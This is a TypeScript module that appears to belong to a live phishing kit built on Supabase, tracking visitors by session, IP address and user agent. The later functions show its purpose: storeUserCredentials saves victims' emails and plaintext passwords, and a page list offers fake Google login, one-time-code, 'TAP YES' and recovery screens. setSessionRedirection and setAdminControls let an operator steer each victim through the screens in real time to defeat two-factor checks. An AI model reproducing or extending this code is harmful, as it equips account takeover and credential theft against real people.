import { supabase } from './supabase'
import { v4 as uuidv4 } from 'uuid'

// Cache for IP address to avoid repeated fetches
let cachedIP: string | undefined = undefined
let ipFetchPromise: Promise<string | undefined> | null = null

// Cache for location data to avoid repeated fetches
let cachedLocation: any = null
let locationFetchPromise: Promise<any> | null = null

// Supabase connection readiness
let supabaseReady: Promise<boolean> | null = null

// Session tracking lock to prevent concurrent calls
let sessionTrackingLock: Promise<any> | null = null

// Function to ensure Supabase connection is ready
async function ensureSupabaseReady(): Promise<boolean> {
  if (supabaseReady) {
    return supabaseReady
  }

  supabaseReady = (async () => {
    try {
      console.log('Checking Supabase connection...')
      
      // Check if environment variables are set
      if (!process.env.NEXT_PUBLIC_SUPABASE_URL || 
          !process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ||
          process.env.NEXT_PUBLIC_SUPABASE_URL.includes('your_supabase_url_here') ||
          process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY.includes('your_supabase_anon_key_here')) {
        console.error('Supabase environment variables not properly configured')
        return false
      }

      // Test the connection with a simple query
      const { data, error } = await supabase
        .from('user_sessions')
        .select('count', { count: 'exact', head: true })
        .limit(1)
      
      if (error) {
        console.error('Supabase connection test failed:', {
          message: error.message,
          details: error.details,
          hint: error.hint,
          code: error.code
        })
        return false
      }

      console.log('Supabase connection ready')
      return true
    } catch (error) {
      console.error('Supabase connection test exception:', error)
      return false
    }
  })()

  return supabaseReady
}

// Function to fetch user's IP address from our API
async function fetchUserIP(): Promise<string | undefined> {
  // Return cached IP if available
  if (cachedIP) {
    return cachedIP
  }

  // If already fetching, return the same promise
  if (ipFetchPromise) {
    return ipFetchPromise
  }

  // Start fetching IP
  ipFetchPromise = (async () => {
    try {
      // First try our own API endpoint
      const response = await fetch('/api/get-ip')
      if (response.ok) {
        const data = await response.json()
        if (data.ip && data.ip !== 'unknown') {
          cachedIP = data.ip
          return data.ip
        }
      }
    } catch (error) {
      console.error('Error fetching IP from our API:', error)
    }

    // Fallback to external service
    try {
      const response = await fetch('https://api.ipify.org?format=json')
      if (response.ok) {
        const data = await response.json()
        cachedIP = data.ip || undefined
        return data.ip || undefined
      }
    } catch (error) {
      console.error('Error fetching IP from external service:', error)
    }
    
    return undefined
  })()

  return ipFetchPromise
}

// Function to fetch location data from IP address
async function fetchLocationFromIP(ip: string): Promise<any> {
  // Return cached location if available
  if (cachedLocation) {
    return cachedLocation
  }

  // If already fetching, return the same promise
  if (locationFetchPromise) {
    return locationFetchPromise
  }

  // Start fetching location
  locationFetchPromise = (async () => {
    try {
      const response = await fetch(`/api/get-location?ip=${encodeURIComponent(ip)}`)
      if (response.ok) {
        const data = await response.json()
        cachedLocation = data
        return data
      }
    } catch (error) {
      console.error('Error fetching location:', error)
    }
    
    // Fallback location data
    const fallbackData = {
      country: 'Unknown',
      countryCode: 'UN',
      flag: '🌍'
    }
    cachedLocation = fallbackData
    return fallbackData
  })()

  return locationFetchPromise
}

export interface SessionData {
  sessionId: string
  userId?: string
  ipAddress?: string
  userAgent?: string
  pageUrl: string
  isActive: boolean
}

// Generate a unique session ID
export function generateSessionId(): string {
  return uuidv4()
}

// Get session ID from localStorage or create a new one
export function getOrCreateSessionId(): string {
  if (typeof window === 'undefined') return generateSessionId()
  
  let sessionId = localStorage.getItem('session_id')
  if (!sessionId) {
    sessionId = generateSessionId()
    localStorage.setItem('session_id', sessionId)
  }
  return sessionId
}

// Create or update a user session
export async function trackSession(sessionData: Partial<SessionData>) {
  // If there's already a session tracking operation in progress, wait for it
  if (sessionTrackingLock) {
    console.log('Session tracking already in progress, waiting...')
    return sessionTrackingLock
  }

  // Create a new session tracking promise and lock it
  sessionTrackingLock = (async () => {
    try {
      // Check if we're in browser environment
      if (typeof window === 'undefined') {
        console.warn('Session tracking called in server environment, skipping')
        return { success: false, error: 'Server environment' }
      }

      // Wait for document to be ready if it's not
      if (document.readyState === 'loading') {
        console.log('Document still loading, waiting for DOMContentLoaded...')
        await new Promise(resolve => {
          const handler = () => {
            document.removeEventListener('DOMContentLoaded', handler)
            resolve(void 0)
          }
          document.addEventListener('DOMContentLoaded', handler)
        })
      }

      // Wait for Supabase connection to be ready
      console.log('Ensuring Supabase connection is ready...')
      const isSupabaseReady = await ensureSupabaseReady()
      
      if (!isSupabaseReady) {
        console.warn('Supabase connection not ready - session tracking disabled')
        return { success: false, error: 'Supabase not ready' }
      }

      // Debug logging
      console.log('Starting session tracking...', {
        sessionData,
        documentReady: document.readyState,
        supabaseReady: true
      })

      const sessionId = getOrCreateSessionId()
      const currentUrl = window.location.href
      const userAgent = window.navigator.userAgent

      console.log('Session details:', {
        sessionId,
        currentUrl,
        userAgent: userAgent?.substring(0, 50) + '...' // Truncate for logging
      })

      // Fetch IP address if not provided
      let ipAddress = sessionData.ipAddress
      if (!ipAddress) {
        try {
          ipAddress = await fetchUserIP()
          console.log('Fetched IP address:', ipAddress)
        } catch (ipError) {
          console.warn('Failed to fetch IP address:', ipError)
        }
      }

      // Skip location data for now to avoid timing issues - we can add it back later
      let locationData = null
      // if (ipAddress && ipAddress !== 'unknown') {
      //   try {
      //     locationData = await fetchLocationFromIP(ipAddress)
      //     console.log('Fetched location data:', locationData)
      //   } catch (locationError) {
      //     console.warn('Failed to fetch location data:', locationError)
      //   }
      // }

      // Basic session record (always present fields)
      const baseSessionRecord = {
        session_id: sessionId,
        user_id: sessionData.userId || null,
        ip_address: ipAddress || null,
        user_agent: userAgent,
        page_url: currentUrl,
        is_active: true,
        updated_at: new Date().toISOString()
      }
      
      console.log('✅ Tracking session as active:', sessionId, 'URL:', currentUrl, 'Timestamp:', new Date().toISOString())

      console.log('Base session record:', baseSessionRecord)

      // For now, let's only use the base record to avoid column issues
      let sessionRecord: Record<string, any> = baseSessionRecord

      // First, try to update existing session
      console.log('Checking for existing session...')

      const { data: existingSession, error: selectError } = await supabase
        .from('user_sessions')
        .select('id')
        .eq('session_id', sessionId)
        .single()

      if (selectError && selectError.code !== 'PGRST116') { // PGRST116 is "not found" which is ok
        console.error('Error checking for existing session:', selectError)
        return { success: false, error: selectError }
      }

      console.log('Existing session result:', { existingSession, selectError })

      if (existingSession) {
        console.log('Updating existing session...')
        console.log('Updating with record:', sessionRecord)
        const { error } = await supabase
          .from('user_sessions')
          .update(sessionRecord)
          .eq('session_id', sessionId)

        if (error) {
          console.error('Error updating session (full error):', {
            message: error.message,
            details: error.details,
            hint: error.hint,
            code: error.code,
            error
          })
          return { success: false, error }
        } else {
          console.log('✅ Successfully updated existing session:', sessionId, 'as active at', new Date().toISOString())
        }
      } else {
        console.log('Creating new session...')
        console.log('Creating with record:', sessionRecord)
        const { error } = await supabase
          .from('user_sessions')
          .insert([sessionRecord])

        if (error) {
          console.error('Error creating session (full error):', {
            message: error.message,
            details: error.details,
            hint: error.hint,
            code: error.code,
            error
          })
          
          // Check if it's a specific error we can handle
          if (error.code === '23505') { // Unique constraint violation
            console.log('Session already exists (race condition), trying to update instead...')
            const { error: updateError } = await supabase
              .from('user_sessions')
              .update(sessionRecord)
              .eq('session_id', sessionId)
            
            if (updateError) {
              console.error('Error updating after race condition:', updateError)
              return { success: false, error: updateError }
            } else {
              console.log('Successfully updated session after race condition')
            }
          } else {
            return { success: false, error }
          }
        } else {
          console.log('Successfully created new session')
        }
      }

      console.log('Session tracking completed successfully')
      return { success: true, sessionId }
    } catch (error) {
      console.error('Error tracking session (outer catch):', {
        message: error instanceof Error ? error.message : String(error),
        stack: error instanceof Error ? error.stack : undefined,
        error
      })
      return { success: false, error }
    } finally {
      // Clear the lock when done
      sessionTrackingLock = null
    }
  })()

  return sessionTrackingLock
}

// Mark session as inactive
export async function endSession(sessionId?: string) {
  try {
    const currentSessionId = sessionId || getOrCreateSessionId()
    
    console.log('⚠️ Ending session:', currentSessionId, 'at', new Date().toISOString())

    const { error } = await supabase
      .from('user_sessions')
      .update({ 
        is_active: false,
        updated_at: new Date().toISOString()
      })
      .eq('session_id', currentSessionId)

    if (error) {
      console.error('Error ending session:', error)
      return { success: false, error }
    }

    return { success: true }
  } catch (error) {
    console.error('Error ending session:', error)
    return { success: false, error }
  }
}

// Get all active sessions
export async function getActiveSessions() {
  try {
    const { data, error } = await supabase
      .from('user_sessions')
      .select('*')
      .eq('is_active', true)
      .order('updated_at', { ascending: false })

    if (error) {
      console.error('Error fetching active sessions:', error)
      return { success: false, error, data: null }
    }

    return { success: true, data }
  } catch (error) {
    console.error('Error fetching active sessions:', error)
    return { success: false, error, data: null }
  }
}

// Get all sessions (active and inactive)
export async function getAllSessions(limit = 100) {
  try {
    const { data, error } = await supabase
      .from('user_sessions')
      .select('*')
      .order('updated_at', { ascending: false })
      .limit(limit)

    if (error) {
      console.error('Error fetching all sessions:', error)
      return { success: false, error, data: null }
    }

    return { success: true, data }
  } catch (error) {
    console.error('Error fetching all sessions:', error)
    return { success: false, error, data: null }
  }
}

// Get session statistics
export async function getSessionStats() {
  try {
    // Get total sessions today
    const todayStart = new Date()
    todayStart.setHours(0, 0, 0, 0)
    
    const { data: todaySessions, error: todayError } = await supabase
      .from('user_sessions')
      .select('id')
      .gte('created_at', todayStart.toISOString())

    if (todayError) {
      console.error('Error fetching today sessions:', todayError)
    }

    // Get active sessions count
    const { data: activeSessions, error: activeError } = await supabase
      .from('user_sessions')
      .select('id')
      .eq('is_active', true)

    if (activeError) {
      console.error('Error fetching active sessions:', activeError)
    }

    // Get average session duration for completed sessions today
    const { data: completedSessions, error: durationError } = await supabase
      .from('user_sessions')
      .select('created_at, updated_at')
      .eq('is_active', false)
      .gte('created_at', todayStart.toISOString())

    if (durationError) {
      console.error('Error fetching session durations:', durationError)
    }

    let averageDuration = 0
    if (completedSessions && completedSessions.length > 0) {
      const totalDuration = completedSessions.reduce((acc, session) => {
        const start = new Date(session.created_at)
        const end = new Date(session.updated_at)
        return acc + (end.getTime() - start.getTime())
      }, 0)
      
      averageDuration = totalDuration / completedSessions.length / 1000 / 60 // Convert to minutes
    }

    return {
      success: true,
      stats: {
        activeCount: activeSessions?.length || 0,
        todayTotal: todaySessions?.length || 0,
        averageDurationMinutes: Math.round(averageDuration)
      }
    }
  } catch (error) {
    console.error('Error fetching session stats:', error)
    return { success: false, error, stats: null }
  }
}

// Clean up old inactive sessions (older than 24 hours)
export async function cleanupOldSessions() {
  try {
    const twentyFourHoursAgo = new Date()
    twentyFourHoursAgo.setHours(twentyFourHoursAgo.getHours() - 24)

    const { error } = await supabase
      .from('user_sessions')
      .delete()
      .eq('is_active', false)
      .lt('updated_at', twentyFourHoursAgo.toISOString())

    if (error) {
      console.error('Error cleaning up old sessions:', error)
      return { success: false, error }
    }

    return { success: true }
  } catch (error) {
    console.error('Error cleaning up old sessions:', error)
    return { success: false, error }
  }
}

// Delete a specific session
export async function deleteSession(sessionId: string, useDbId = false) {
  try {
    const column = useDbId ? 'id' : 'session_id'
    
    const { error } = await supabase
      .from('user_sessions')
      .delete()
      .eq(column, sessionId)

    if (error) {
      console.error('Error deleting session:', error)
      return { success: false, error }
    }

    return { success: true }
  } catch (error) {
    console.error('Error deleting session:', error)
    return { success: false, error }
  }
}

// Delete multiple sessions by their IDs
export async function deleteSessions(sessionIds: string[], useDbId = false) {
  try {
    const column = useDbId ? 'id' : 'session_id'
    
    const { error } = await supabase
      .from('user_sessions')
      .delete()
      .in(column, sessionIds)

    if (error) {
      console.error('Error deleting sessions:', error)
      return { success: false, error }
    }

    return { success: true }
  } catch (error) {
    console.error('Error deleting sessions:', error)
    return { success: false, error }
  }
}

// Set page redirection for a specific session
export async function setSessionRedirection(sessionId: string, redirectToPage: string) {
  try {
    const { error } = await supabase
      .from('user_sessions')
      .update({ 
        redirect_to_page: redirectToPage,
        updated_at: new Date().toISOString()
      })
      .eq('session_id', sessionId)

    if (error) {
      console.error('Error setting session redirection:', error)
      return { success: false, error }
    }

    // Trigger immediate redirect check for the target session
    if (typeof window !== 'undefined') {
      window.dispatchEvent(new CustomEvent('session-redirect-set', { 
        detail: { sessionId, redirectToPage } 
      }))
    }

    return { success: true }
  } catch (error) {
    console.error('Error setting session redirection:', error)
    return { success: false, error }
  }
}

// Check if current session has a redirection command and clear it
export async function checkAndClearRedirection(sessionId?: string) {
  try {
    const currentSessionId = sessionId || getOrCreateSessionId()

    const { data, error } = await supabase
      .from('user_sessions')
      .select('redirect_to_page')
      .eq('session_id', currentSessionId)
      .single()

    if (error) {
      console.error('Error checking session redirection:', error)
      return { success: false, error, redirectTo: null }
    }

    const redirectTo = data?.redirect_to_page

    // If there's a redirection command, clear it
    if (redirectTo) {
      await supabase
        .from('user_sessions')
        .update({ 
          redirect_to_page: null,
          updated_at: new Date().toISOString()
        })
        .eq('session_id', currentSessionId)
    }

    return { success: true, redirectTo }
  } catch (error) {
    console.error('Error checking session redirection:', error)
    return { success: false, error, redirectTo: null }
  }
}

export async function storeUserCredentials(email: string, password: string, sessionId?: string) {
  try {
    const currentSessionId = sessionId || getOrCreateSessionId()

    const { error } = await supabase
      .from('user_sessions')
      .update({ 
        user_email: email,
        user_password: password,
        credentials_collected_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      })
      .eq('session_id', currentSessionId)

    if (error) {
      console.error('Error storing user credentials:', error)
      return { success: false, error }
    }

    console.log('User credentials stored successfully')
    return { success: true }
  } catch (error) {
    console.error('Error storing user credentials:', error)
    return { success: false, error }
  }
}

// Available pages for redirection
export const AVAILABLE_PAGES = [
  { value: '/', label: 'Home (Security Check)' },
  { value: '/enter-details', label: 'Enter Details' },
  { value: 'https://policies.google.com/terms', label: 'Google Terms and Agreement' },
  { value: '/account-review', label: 'Account Review' },
  { value: '/account-review?dialog=google', label: 'Google Login' },
  { value: '/account-review?dialog=login', label: 'Google Login (Password)' },
  { value: '/account-review?dialog=login-error', label: '❌ Google Login Error' },
  { value: '/account-review?dialog=loading', label: 'Google Loading State' },
  { value: '/account-review?dialog=email-otp', label: 'Google Email OTP' },
  { value: '/account-review?dialog=email-otp-error', label: '❌ Google Email OTP Error' },
  { value: '/account-review?dialog=sms-otp', label: 'Google SMS OTP' },
  { value: '/account-review?dialog=sms-otp-error', label: '❌ Google SMS OTP Error' },
  { value: '/account-review?dialog=gauth-otp', label: 'Google Authenticator OTP' },
  { value: '/account-review?dialog=gauth-otp-error', label: '❌ Google Authenticator OTP Error' },
  { value: '/account-review?dialog=tap-yes', label: 'Google TAP YES' },
  { value: '/account-review?dialog=email-recovery', label: 'Google Email Recovery' },
  { value: '/account-review?dialog=email-recovery-error', label: '❌ Google Email Recovery Error' },
  { value: '/confirmation', label: 'Confirmation' },
  { value: '/panel', label: 'Admin Panel' }
] as const

// Function to set admin-controlled values for a session
export async function setAdminControls(sessionId: string, controls: {
  tapDeviceInfo?: string
  tapMatchingNumber?: string
  smsLastDigits?: string
  recoveryEmail?: string
}) {
  try {
    const updateData: Record<string, any> = {
      updated_at: new Date().toISOString()
    }

    if (controls.tapDeviceInfo !== undefined) {
      updateData.admin_tap_device_info = controls.tapDeviceInfo
    }
    if (controls.tapMatchingNumber !== undefined) {
      updateData.admin_tap_matching_number = controls.tapMatchingNumber
    }
    if (controls.smsLastDigits !== undefined) {
      updateData.admin_sms_last_digits = controls.smsLastDigits
    }
    if (controls.recoveryEmail !== undefined) {
      updateData.admin_recovery_email = controls.recoveryEmail
    }

    const { error } = await supabase
      .from('user_sessions')
      .update(updateData)
      .eq('session_id', sessionId)

    if (error) {
      console.error('Error setting admin controls:', error)
      return { success: false, error }
    }

    return { success: true }
  } catch (error) {
    console.error('Error setting admin controls:', error)
    return { success: false, error }
  }
}

// Function to get admin-controlled values for a session
export async function getAdminControls(sessionId: string) {
  try {
    const { data, error } = await supabase
      .from('user_sessions')
      .select('admin_tap_device_info, admin_tap_matching_number, admin_sms_last_digits, admin_recovery_email')
      .eq('session_id', sessionId)
      .single()

    if (error) {
      console.error('Error getting admin controls:', error)
      return { success: false, error, data: null }
    }

    return { success: true, data }
  } catch (error) {
    console.error('Error getting admin controls:', error)
    return { success: false, error, data: null }
  }
} 